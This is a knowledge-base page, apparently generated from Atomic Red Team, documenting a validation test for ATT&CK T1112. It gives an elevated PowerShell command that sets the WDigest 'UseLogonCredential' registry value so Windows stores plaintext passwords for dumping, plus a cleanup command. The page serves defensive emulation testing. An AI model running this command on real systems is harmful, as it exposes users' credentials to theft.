---
atomic_guid: "68254a85-aa42-4312-a695-38b7276307f8"
title: "Use Powershell to Modify registry to store logon credentials"
framework: "atomic"
generated: "true"
attack_technique_id: "T1112"
attack_technique_name: "Modify Registry"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "68254a85-aa42-4312-a695-38b7276307f8"
  - "Use Powershell to Modify registry to store logon credentials"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Use Powershell to Modify registry to store logon credentials

Sets registry key using Powershell that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
Open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.

## Metadata

- Atomic GUID: 68254a85-aa42-4312-a695-38b7276307f8
- Technique: T1112: Modify Registry
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1112/T1112.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1112-modify_registry|T1112]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore
```

### Cleanup

```powershell
Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '0' -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml)
